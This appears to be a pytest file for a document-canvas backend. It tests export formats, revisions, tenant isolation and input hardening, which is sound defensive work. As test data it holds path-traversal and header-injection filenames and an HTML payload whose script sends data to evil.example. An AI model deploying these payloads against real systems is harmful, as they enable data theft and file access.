"""R2 Canvas CP-05 — Export provider (WO-C13) and Security & resource control (WO-C14).

Also covers the Backend-side items of CP-06 (WO-C15) that are backend-only: existing chat surface
unchanged, export hardening, HTML preview safety, isolation, size/revision limits.
"""
from __future__ import annotations

import asyncio

import pytest

from app.canvas.errors import CanvasError, CanvasErrorCode
from app.canvas.export import (
    OFFICE_EXPORT_CONTRACT,
    build_content_disposition,
    safe_filename,
)
from app.canvas.security import (
    PREVIEW_CSP,
    preview_policy,
    sanitize_html_for_preview,
    sanitize_title,
)
from tests.r2_canvas_support import BASE, client, headers


async def _artifact(c, *, title="내보내기 문서", artifact_type="markdown", content="# 제목\n\n본문", **extra):
    r = await c.post(
        f"{BASE}/artifacts",
        headers=headers(),
        json={"title": title, "artifact_type": artifact_type, "content": content, **extra},
    )
    assert r.status_code == 201, r.text
    return r.json()["artifact"]["artifact_id"]


@pytest.mark.asyncio
async def test_export_formats_and_mime_types(canvas):
    async with client() as c:
        md = await _artifact(c, content="# 제목\n\n본문")
        r = await c.get(f"{BASE}/artifacts/{md}/export", headers=headers())
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/markdown")
        assert r.text.startswith("# 제목")
        assert r.headers["x-canvas-format"] == "md"
        assert r.headers["x-canvas-revision"] == "1"
        assert r.headers["x-content-type-options"] == "nosniff"
        assert 'filename="' in r.headers["content-disposition"]
        assert "filename*=UTF-8''" in r.headers["content-disposition"]

        r = await c.get(f"{BASE}/artifacts/{md}/export", headers=headers(), params={"format": "txt"})
        assert r.headers["content-type"].startswith("text/plain")

        r = await c.get(f"{BASE}/artifacts/{md}/export", headers=headers(), params={"format": "html"})
        assert r.headers["content-type"].startswith("text/html")
        assert "<pre>" in r.text
        assert r.headers.get("x-canvas-export-warnings")

        text = await _artifact(c, title="텍스트", artifact_type="plain_text", content="그냥 텍스트")
        r = await c.get(f"{BASE}/artifacts/{text}/export", headers=headers())
        assert r.headers["content-type"].startswith("text/plain")
        assert r.text == "그냥 텍스트"

        code = await _artifact(
            c, title="스크립트", artifact_type="source_code", language="python", content="print('hi')\n"
        )
        r = await c.get(f"{BASE}/artifacts/{code}/export", headers=headers())
        assert r.status_code == 200
        disposition = r.headers["content-disposition"]
        assert disposition.endswith(".py\"") or ".py" in disposition
        r = await c.get(f"{BASE}/artifacts/{code}/export", headers=headers(), params={"format": "txt"})
        assert r.status_code == 200

        data = await _artifact(c, title="데이터", artifact_type="structured_json", content='{"a": 1}')
        r = await c.get(f"{BASE}/artifacts/{data}/export", headers=headers())
        assert r.headers["content-type"].startswith("application/json")
        assert r.text == '{"a": 1}'

        # unsupported format and office formats are refused with an explicit contract
        r = await c.get(f"{BASE}/artifacts/{md}/export", headers=headers(), params={"format": "pdf"})
        assert r.status_code == 400
        assert r.json()["detail"]["code"] == "export_format_unsupported"
        assert r.json()["detail"]["context"]["contract"]["status"] == "not_implemented_r2"
        r = await c.get(f"{BASE}/artifacts/{md}/export", headers=headers(), params={"format": "csv"})
        assert r.status_code == 400


@pytest.mark.asyncio
async def test_export_targets_a_selected_revision(canvas):
    async with client() as c:
        aid = await _artifact(c, content="1판 본문")
        r = await c.post(
            f"{BASE}/artifacts/{aid}/patches",
            headers=headers(),
            json={
                "base_revision": 1,
                "operation": "replace_content",
                "replacement_text": "2판 본문",
                "expected_original_text": "1판 본문",
            },
        )
        assert r.status_code == 200
        r = await c.get(f"{BASE}/artifacts/{aid}/export", headers=headers())
        assert r.text == "2판 본문"
        r = await c.get(f"{BASE}/artifacts/{aid}/export", headers=headers(), params={"revision": 1})
        assert r.text == "1판 본문"
        assert r.headers["x-canvas-revision"] == "1"


def test_safe_filename_blocks_path_traversal_and_header_injection():
    hostile = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config",
        "/absolute/path.md",
        "name\r\nX-Injected: yes",
        "name\nX-Injected: yes",
        "quote\"and'single",
        "  . . ",
        "",
        "가" * 300,
    ]
    for title in hostile:
        name = safe_filename(title, ".md")
        assert "/" not in name and "\\" not in name
        assert "\r" not in name and "\n" not in name
        assert ".." not in name
        assert name.endswith(".md")
        assert len(name) <= 84
        disposition = build_content_disposition(name)
        assert "\r" not in disposition and "\n" not in disposition
        assert disposition.startswith("attachment; filename=")

    assert safe_filename("보고서 2026", ".md").endswith(".md")
    assert safe_filename("보고서 2026", "md").startswith("보고서 2026")
    assert safe_filename("", ".txt") == "artifact.txt"
    # an unexpected extension cannot escape the file-name grammar
    assert safe_filename("t", ".exe/../x").endswith(".txt")


@pytest.mark.asyncio
async def test_title_hardening_on_create(canvas):
    async with client() as c:
        r = await c.post(
            f"{BASE}/artifacts",
            headers=headers(),
            json={"title": "../../escape\r\nX: 1", "artifact_type": "markdown", "content": "x"},
        )
        assert r.status_code == 201
        title = r.json()["artifact"]["title"]
        assert "/" not in title and "\\" not in title and "\r" not in title and "\n" not in title
        aid = r.json()["artifact"]["artifact_id"]
        r = await c.get(f"{BASE}/artifacts/{aid}/export", headers=headers())
        disposition = r.headers["content-disposition"]
        assert "\r" not in disposition and "\n" not in disposition
        assert "../" not in disposition

        r = await c.post(
            f"{BASE}/artifacts", headers=headers(), json={"title": "   ", "artifact_type": "markdown", "content": "x"}
        )
        assert r.status_code == 422
        with pytest.raises(CanvasError):
            sanitize_title("   ")


def test_html_preview_sanitizer_removes_active_content():
    payload = """
    <h1>제목</h1>
    <script>fetch('https://evil.example/steal')</script>
    <p onclick="alert(1)">문단</p>
    <a href="javascript:alert(2)">링크</a>
    <a href="https://example.com/doc">정상 링크</a>
    <a href="//evil.example/proto">프로토콜 상대 링크</a>
    <a href="\\\\evil.example\\back">백슬래시 링크</a>
    <a href="/relative/path">상대 링크</a>
    <iframe src="https://evil.example"></iframe>
    <img src="https://evil.example/pixel.png">
    <img src="data:image/png;base64,iVBORw0KGgo=">
    <div style="background:url(https://evil.example/x)">스타일</div>
    <form action="/steal"><input name="c"></form>
    """
    result = sanitize_html_for_preview(payload)
    html = result["html"]
    assert "<script" not in html
    assert "onclick" not in html
    assert "javascript:" not in html
    assert "<iframe" not in html
    assert "evil.example/pixel.png" not in html
    assert "evil.example/x" not in html
    assert "<form" not in html and "<input" not in html
    assert "style=" not in html
    assert "<h1>제목</h1>" in html
    assert "https://example.com/doc" in html
    assert "//evil.example/proto" not in html
    assert "evil.example\\back" not in html
    assert '"/relative/path"' in html
    assert 'rel="noopener noreferrer nofollow"' in html
    assert "data:image/png;base64" in html
    assert {"script", "iframe", "form", "input"} <= set(result["removed_tags"])
    assert "onclick" in result["blocked_attributes"]
    assert "style" in result["blocked_attributes"]

    policy = preview_policy()
    assert policy["allow_scripts"] is False
    assert policy["allow_network"] is False
    assert "script-src 'none'" in PREVIEW_CSP
    assert "default-src 'none'" in PREVIEW_CSP


@pytest.mark.asyncio
async def test_html_artifact_preview_and_export_are_sanitized(canvas):
    unsafe = (
        "<h2>보고서</h2><script>alert(1)</script>"
        "<p onmouseover=\"steal()\">본문</p><img src=\"http://internal.example/secret.png\">"
    )
    async with client() as c:
        aid = await _artifact(c, title="html 문서", artifact_type="html", content=unsafe)
        r = await c.get(f"{BASE}/artifacts/{aid}/preview", headers=headers())
        assert r.status_code == 200
        body = r.json()
        assert body["html_preview"] is True
        assert "<script" not in body["sanitized_html"]
        assert "onmouseover" not in body["sanitized_html"]
        assert "internal.example" not in body["sanitized_html"]
        assert body["policy"]["allow_scripts"] is False
        assert body["sanitization"]["changed"] is True
        assert set(body["policy"]["iframe_sandbox"].split()) == {"allow-same-origin"}

        r = await c.get(f"{BASE}/artifacts/{aid}/export", headers=headers())
        assert r.status_code == 200
        assert "<script" not in r.text
        assert "internal.example" not in r.text
        assert r.headers.get("x-canvas-export-warnings")


@pytest.mark.asyncio
async def test_preview_of_text_artifact_returns_text_and_metrics(canvas):
    async with client() as c:
        aid = await _artifact(c, content="가나다")
        r = await c.get(f"{BASE}/artifacts/{aid}/preview", headers=headers())
        assert r.status_code == 200
        body = r.json()
        assert body["text"] == "가나다"
        assert body["content_metrics"]["codepoints"] == 3
        assert body["policy"]["allow_network"] is False


@pytest.mark.asyncio
async def test_tenant_isolation(canvas):
    async with client() as c:
        aid = await _artifact(c)
        r = await c.get(f"{BASE}/artifacts/{aid}", headers=headers(tenant="another_tenant"))
        assert r.status_code == 404
        r = await c.get(f"{BASE}/artifacts/{aid}/export", headers=headers(tenant="another_tenant"))
        assert r.status_code == 404
        r = await c.post(
            f"{BASE}/artifacts/{aid}/patches",
            headers=headers(tenant="another_tenant"),
            json={"base_revision": 1, "operation": "append_content", "replacement_text": "탈취"},
        )
        assert r.status_code == 404
        r = await c.get(f"{BASE}/artifacts/{aid}", headers=headers())
        assert r.status_code == 200
        assert "탈취" not in r.text


def test_no_scope_override_via_tool_or_patch_payload(canvas):
    from app.canvas.models import PatchRequest  # noqa: F401  (import kept to prove the model exists)
    from app.canvas.security import reject_scope_override

    for payload in (
        {"tenant_id": "t2"},
        {"owner_id": "u2"},
        {"service_id": "hd2ai-public"},
        {"role": "admin"},
        {"workspace_access": "admin"},
    ):
        with pytest.raises(CanvasError) as exc:
            reject_scope_override(payload, source="test")
        assert exc.value.code is CanvasErrorCode.FORBIDDEN

    # extra keys are rejected by the request models themselves (HTTP 422)
    asyncio.run(_assert_extra_keys_rejected())


async def _assert_extra_keys_rejected() -> None:
    async with client() as c:
        aid = await _artifact(c)
        r = await c.post(
            f"{BASE}/artifacts/{aid}/patches",
            headers=headers(),
            json={
                "base_revision": 1,
                "operation": "append_content",
                "replacement_text": "x",
                "tenant_id": "other",
            },
        )
        assert r.status_code == 422
        r = await c.post(
            f"{BASE}/artifacts",
            headers=headers(),
            json={"title": "t", "artifact_type": "markdown", "content": "c", "owner_id": "u2"},
        )
        assert r.status_code == 422
        r = await c.get(f"{BASE}/artifacts/{aid}", headers=headers())
        assert r.json()["artifact"]["current_revision"] == 1


@pytest.mark.asyncio
async def test_existing_chat_surface_is_unchanged_by_canvas(canvas):
    async with client() as c:
        r = await c.get("/api/v1/agent/agents", headers=headers())
        assert r.status_code == 200
        agents = r.json()["agents"]
        tools = agents[0]["allowed_tools"]
        # The pre-existing chat surface still serves its document tools. Whether canvas.* appears
        # in this unfiltered list depends on registry opt-in (asserted in test_r2_canvas_ai.py);
        # no service profile exposes canvas.* yet.
        assert any(name.startswith("document.") for name in tools)
        r = await c.get("/api/v1/health", headers=headers())
        assert r.status_code == 200

        r = await c.get(f"{BASE}/capabilities", headers=headers())
        caps = r.json()
        assert caps["ai_edit"]["ai_integration_verified"] is False
        assert caps["storage"]["independent_dev_database"] is True
        assert caps["workspace"]["provider_mode"] == "dev"
        assert caps["workspace"]["enforced"] is False
        assert caps["security"]["generated_code_execution"] is False
        # no secret, credential value or internal header name is exposed
        text = str(caps).lower()
        for forbidden in ("authorization", "bearer", "password", "secret", "api_key", "x-hd2lab"):
            assert forbidden not in text

        r = await c.get(f"{BASE}/tools/manifest", headers=headers())
        manifest = r.json()
        assert len(manifest["tools"]) == 8
        assert manifest["integration"]["runtime_tool_calling"].startswith("not connected")
        assert all(set(tool["parameters"].get("properties", {})) & {"tenant_id", "owner_id"} == set() for tool in manifest["tools"])
        assert "pdf" in OFFICE_EXPORT_CONTRACT and "docx" in OFFICE_EXPORT_CONTRACT
